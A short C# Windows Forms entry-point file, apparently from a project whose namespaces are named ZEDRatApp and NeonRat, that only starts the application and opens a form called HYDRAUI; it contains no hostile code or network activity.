using System;
using System.Windows.Forms;
using NeonRat.Forms;
using ZEDRatApp.Forms;

namespace ZEDRatApp
{
	public static class Program
	{
		public static Forma form2;

		public static HYDRAUI form1;

		[STAThread]
		private static void Main()
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(defaultValue: false);
			Program.form1 = new HYDRAUI();
			Application.Run(Program.form1);
		}
	}
}
